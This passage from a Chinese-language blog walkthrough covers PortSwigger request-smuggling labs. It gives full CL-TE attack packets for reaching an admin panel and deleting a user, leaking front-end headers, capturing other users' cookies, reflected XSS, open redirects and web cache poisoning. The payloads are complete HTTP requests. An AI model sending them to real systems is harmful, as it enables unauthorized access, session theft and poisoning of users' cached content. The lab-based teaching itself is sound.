</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>45</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>0
</span></span></span><span class=line><span class=cl><span class=g>
</span></span></span><span class=line><span class=cl><span class=g>GET /admin HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=g>Host: localhost
</span></span></span></code></pre></td></tr></table></div></div><p>我们可以看到成功访问到了<code>/admin</code>面板内容，如果不成功可以多发送几次试试看</p><p><img src=https://blogpic.zdy.one/img/20191123155053.png loading=lazy></p><p>得到了删除的 api ，于是我们再利用 HTTP Smuggling 访问这个 <code>/admin/delete?username=carlos</code> 即可，构造如下数据包：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>63</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>0
</span></span></span><span class=line><span class=cl><span class=g>
</span></span></span><span class=line><span class=cl><span class=g>GET /admin/delete?username=carlos HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=g>Host: localhost
</span></span></span></code></pre></td></tr></table></div></div><p><img src=https://blogpic.zdy.one/img/20191123155603.png loading=lazy></p><p>这种攻击方式类似 HTTP SSRF ，主要的点就是在控制 CL 数值上，比如说第一个数据包 CL 的值为 28 ，是这么计算的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0\r\n														--&gt; 3个字节
</span></span><span class=line><span class=cl>\r\n														--&gt; 2个字节
</span></span><span class=line><span class=cl>GET /admin HTTP/1.1\r\n					--&gt; 19+2 = 21 个字节
</span></span><span class=line><span class=cl>\r\n														--&gt; 2个字节
</span></span></code></pre></td></tr></table></div></div><p>所以这么结算下来就是 3+2+21+2 = 28字节。</p><p>TE-CL 的情况类似，这里就不再重复举例了。</p><h3 id=revealing-front-end-request-rewriting>Revealing Front-end Request Rewriting</h3><blockquote><p>​ 在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：</p><ul><li>描述TLS连接所使用的协议和密码</li><li>包含用户IP地址的XFF头</li><li>用户的会话令牌ID</li></ul><p>总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：</p><ul><li>找一个能够将请求参数的值输出到响应中的POST请求</li><li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li><li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li></ul></blockquote><p>有时候 Front 服务器会给转发的请求添加一些请求头再转发给 Backend 服务器，我们可以利用 HTTP Smuggling 的方式来泄露这些请求头。同样我们借助 LAB 来实践理解：<a class=link href=https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting target=_blank rel=noopener>Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&rsquo;t support chunked encoding.</p><p>There&rsquo;s an admin panel at /admin, but it&rsquo;s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It&rsquo;s similar to the X-Forwarded-For header but has a different name.</p><p>To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.</p></blockquote><p>这里根据题目提示，场景是一个 CL-TE 的场景，并且给出一个搜索框，我们尝试随便搜索一个 123 ，可以发现搜索结果“123”直接回显到了相应当中。</p><p><img src=https://blogpic.zdy.one/img/20191124191719.png loading=lazy></p><p>尝试使用 HTTP Smuggling 方式访问，但是被 blocked ：</p><p><img src=https://blogpic.zdy.one/img/20191124203138.png loading=lazy></p><p>然后我们可以尝试利用搜索回显把 Front 服务器转发的请求头给泄露出来：</p><p><img src=https://blogpic.zdy.one/img/20191124202357.png loading=lazy></p><p>如果后面只是添加那个 X-*-Ip 的请求头是访问不了 admin 面板的，因为这样会让 Backend 收到两个重复的请求头，在这个场景当中，Backend 服务器对重复的请求头做出了判断：</p><p><img src=https://blogpic.zdy.one/img/20191124204018.png loading=lazy></p><p>所以我们需要把 Front 服务器添加的请求头给“隐藏”掉，我们就可以利用 Smuggling 通过 body 的方式把其他 Front 服务器添加的请求头“隐藏”掉，然后我们就可以得到 admin 面板回显：</p><p><img src=https://blogpic.zdy.one/img/20191124203108.png loading=lazy></p><p>整个流程看起来比较简单，但是仔细做的话，其实 CL 的值比较关键，我们来看看泄露 Front 请求的那个数据包的 CL 值怎么算的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0\r\n																										--&gt;	3个字节
</span></span><span class=line><span class=cl>\r\n																										--&gt; 2个字节
</span></span><span class=line><span class=cl>POST / HTTP/1.1\r\n																			--&gt;	17个字节
</span></span><span class=line><span class=cl>Content-Length: 70\r\n																	--&gt;	20个字节
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded\r\n			--&gt;	49个字节
</span></span><span class=line><span class=cl>\r\n																										--&gt; 2个字节
</span></span><span class=line><span class=cl>search=123																							--&gt; 10个字节
</span></span></code></pre></td></tr></table></div></div><p>总共是 103 个字节，这里的 CL 也可以不是 70 ，这里只是控制泄露多少字节的内容。</p><p>还有一个比较需要注意的就是如果你不添加 Content-Type 字段的话，需要在最后添加一个<code>\r\n</code>，否则会返回 400 。</p><h3 id=capturing-other-users-requests>Capturing other users&rsquo; requests</h3><p>既然能拿到中间件请求，当然我们也可以尝试去拿其他用户的请求，也能拿到 Cookie 等，LAB 地址：<a class=link href=https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests target=_blank rel=noopener>Lab: Exploiting HTTP request smuggling to capture other users&rsquo; requests</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&rsquo;t support chunked encoding.</p><p>To solve the lab, smuggle a request to the back-end server that causes the next user&rsquo;s request to be stored in the application. Then retrieve the next user&rsquo;s request and use the victim user&rsquo;s cookies to access their account.</p></blockquote><p>原理也比较简单，我们可以找到一个发评论的地方，然后利用评论处进行 HTTP Smuggling，例如，我们可以构造以下请求包：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>ac951f7d1e9ea625803c617f003f005c.web-security-academy.net</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>271</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST /post/comment HTTP/1.1
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: 600
</span></span><span class=line><span class=cl>Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN&amp;postId=5&amp;name=1&amp;email=1%40qq.com&amp;website=http%3A%2F%2Fwww.baidu.com&amp;comment=1
</span></span></code></pre></td></tr></table></div></div><p>只要下面这个 CL 足够大，我们就可以用 HTTP Smuggling 把下一个用户的请求拼接到我们最后一个 comment 参数里面了，然后我们在看评论处就可以看到别人的请求头了。</p><p><img src=https://blogpic.zdy.one/img/20191124213544.png loading=lazy></p><h3 id=exploit-reflected-xss>Exploit Reflected XSS</h3><p>这个利用场景可能比较受限，也比较少见，但是如果存在 HTTP Smuggling & reflected XSS ，我们就可以利用这个组合拳 X 到别人的 cookie</p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&rsquo;t support chunked encoding.</p><p>The application is also vulnerable to <a class=link href=https://portswigger.net/web-security/cross-site-scripting/reflected target=_blank rel=noopener>reflected XSS</a> via the User-Agent header.</p><p>To solve the lab, smuggle a request to the back-end server that causes the next user&rsquo;s request to receive a response containing an XSS exploit that executes alert(1).</p></blockquote><p>还是依旧的 CL-TE 场景，我们可以在 UA 处发现有一个反射 XSS，but 单是这样没什么用，所以我们得想点办法升级危害。</p><p><img src=https://blogpic.zdy.one/img/20191124235543.png loading=lazy></p><p>我们可以构造以下数据包，只要发送一次</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>ac811f011e27d43b80301693005a0007.web-security-academy.net</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>150</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>0
</span></span></span><span class=line><span class=cl><span class=g>
</span></span></span><span class=line><span class=cl><span class=g>GET /post?postId=5 HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=g>User-Agent: &#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=g>Content-Type: application/x-www-form-urlencoded
</span></span></span><span class=line><span class=cl><span class=g>Content-Length: 5
</span></span></span><span class=line><span class=cl><span class=g>
</span></span></span><span class=line><span class=cl><span class=g>x=1
</span></span></span></code></pre></td></tr></table></div></div><p>然后我们随便访问该站任何页面都会被弹窗了，因为我们的请求被嵌入到了上面的第二个请求当中：</p><p><img src=https://blogpic.zdy.one/img/20191125000410.png loading=lazy></p><p><img src=https://blogpic.zdy.one/img/20191125001149.png loading=lazy></p><h3 id=turn-an-on-site-redirect-into-an-open-redirect>Turn An On-Site Redirect Into An Open Redirect</h3><p>这种攻击场景是在目标在使用 30x 跳转的时候，使用了 Host 头进行跳转，例如在 Apache & IIS 服务器上，一个uri 最后不带 / 的请求会被 30x 导向带 / 的地址，例如发送以下请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/home</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>normal-website.com</span>
</span></span></code></pre></td></tr></table></div></div><p>我们会得到 Response :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>301</span> <span class=ne>Moved Permanently</span>
</span></span><span class=line><span class=cl><span class=n>Location</span><span class=o>:</span> <span class=l>https://normal-website.com/home/</span>
</span></span></code></pre></td></tr></table></div></div><p>看起来没什么危害，但是如果我们配合 HTTP Smuggling 就会有问题了，例如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>vulnerable-website.com</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>54</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>0
</span></span></span><span class=line><span class=cl><span class=g>
</span></span></span><span class=line><span class=cl><span class=g>GET /home HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=g>Host: attacker-website.com
</span></span></span><span class=line><span class=cl><span class=g>Foo: X
</span></span></span></code></pre></td></tr></table></div></div><p>Smugle 之后的请求会像以下这样：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/home</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>attacker-website.com</span>
</span></span><span class=line><span class=cl><span class=n>Foo</span><span class=o>:</span> <span class=l>XGET /scripts/include.js HTTP/1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>vulnerable-website.com</span>
</span></span></code></pre></td></tr></table></div></div><p>然后如果服务器根据 Host 进行跳转的话，我们会得到以下的 Response:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>301</span> <span class=ne>Moved Permanently</span>
</span></span><span class=line><span class=cl><span class=n>Location</span><span class=o>:</span> <span class=l>https://attacker-website.com/home/</span>
</span></span></code></pre></td></tr></table></div></div><p>这样，受害者，也就是访问<code>/scripts/include.js</code>这个的用户，会被跳转到我们控制的 url 了。</p><h3 id=perform-web-cache-poisoning>Perform Web Cache Poisoning</h3><p>这个场景也是基于上面的 Host 跳转的攻击场景，如果 Front 服务器还存在缓存静态资源的话，我们可以配合 HTTP Smuggling 进行缓存投毒，<a class=link href=https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning target=_blank rel=noopener>Lab: Exploiting HTTP request smuggling to perform web cache poisoning</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&rsquo;t support chunked encoding. The front-end server is configured to cache certain responses.</p><p>To solve the lab, perform a <a class=link href=https://portswigger.net/web-security/request-smuggling target=_blank rel=noopener>request smuggling</a> attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server.</p></blockquote><p>这个环境也是一个可以修改 Host 进行跳转的场景，而在<code>/post/next?postId=2</code>路由正好有一个跳转的 api 供我们使用，这个路由跳转到的是<code>/post?postId=4</code>。</p><p>根据题目描述，我们需要实现缓存投毒， 例如这里我们就选择<code>/resources/js/tracking.js</code>进行投毒，LAB 还给了我们制造投毒的服务，于是我们可以进行以下设置：</p><p><img src=https://blogpic.zdy.one/img/20191129014911.png loading=lazy></p><p>发送以下数据包一次：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>ac7a1f141fadd93d801c469f005500bf.web-security-academy.net</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=f6c7ZBB52a6iedorGSywc8jM6USu4685</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>178</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>GET /post/next?postId=3 HTTP/1.1
</span></span><span class=line><span class=cl>Host: ac701fe61fabd97b8027465701f800a8.web-security-academy.net
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: 10
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>x=1
</span></span></code></pre></td></tr></table></div></div><p>然后访问<code>/resources/js/tracking.js</code>:</p><p><img src=https://blogpic.zdy.one/img/20191129015245.png loading=lazy></p><p>我们可以看到响应包的跳转地址被我们修改成了我们 exploit 的服务器地址，然后我们访问正常服务器主页试试：</p><p><img src=https://blogpic.zdy.one/img/20191129015530.png loading=lazy></p><p>可以看到成功<code>alert(1)</code>。</p><p>整个流程我们可以利用以下流程来理解：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Innocent        Attacker          Front           Backend
</span></span><span class=line><span class=cl>    |               |               |               |
</span></span><span class=line><span class=cl>    |               |--A(1A+1/2B)--&gt;|               | 
</span></span><span class=line><span class=cl>    |               |               |--A(1A+1/2B)--&gt;| 
</span></span><span class=line><span class=cl>    |               |               |&lt;-A(200)-------|
</span></span><span class=line><span class=cl>    |               |               |            [1/2B]
</span></span><span class=line><span class=cl>    |               |&lt;-A(200)-------|            [1/2B]
</span></span><span class=line><span class=cl>    |               |--C-----------&gt;|            [1/2B]
</span></span><span class=line><span class=cl>    |               |               |--C-----------&gt;| * ending B *
</span></span><span class=line><span class=cl>    |               |            [*CP*]&lt;--B(200)----|
</span></span><span class=line><span class=cl>    |               |&lt;--B(200)------|               |
</span></span><span class=line><span class=cl>    |--C---------------------------&gt;|               |
</span></span><span class=line><span class=cl>    |&lt;--B(200)--------------------[HIT]             |
</span></span></code></pre></td></tr></table></div></div><ul><li>1A + 1/2B means request A + an incomplete query B</li><li>A(X) : means X query is hidden in body of query A</li><li>CP : Cache poisoning</li></ul><p>与之前那个流程图类似，因为在 C 请求的<code>/resources/js/tracking.js</code>会被 Front 认为是静态资源缓存起来，而我们利用 HTTP Smuggling 将这个请求导向了我们的 exploit 服务器，返回了<code>alert(1)</code>给 C 请求，然后这个响应包就会被 Front 服务器缓存起来，这样我们就成功进行了投毒。</p><h3 id=perform-web-cache-deception>Perform Web Cache Deception</h3><p>其实这个场景与缓存投毒类似，但是稍有一点区别，按照比较官方的说法，缓存欺骗与缓存投毒有以下这些区别：</p><blockquote><p>​ What is the difference between web cache poisoning and web cache deception?</p><ul><li>In <strong>web cache poisoning</strong>, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.</li><li>In <strong>web cache deception</strong>, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.</li></ul></blockquote><p>在 Web 缓存投毒中，攻击者使应用程序将某些恶意内容存储在缓存中，并将该内容从缓存中提供给其他应用程序用户。
在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索该内容。</p><p>这个我们就不配合 <a class=link href=https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception target=_blank rel=noopener>Lab: Exploiting HTTP request smuggling to perform web cache deception</a> 来做了，因为 LAB 提供的环境 victim 有点问题。</p><p>我们可以这么理解，我们发送如下 HTTP 请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>vulnerable-website.com</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>43</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>0
</span></span></span><span class=line><span class=cl><span class=g>
</span></span></span><span class=line><span class=cl><span class=g>GET /private/messages HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=g>Foo: X
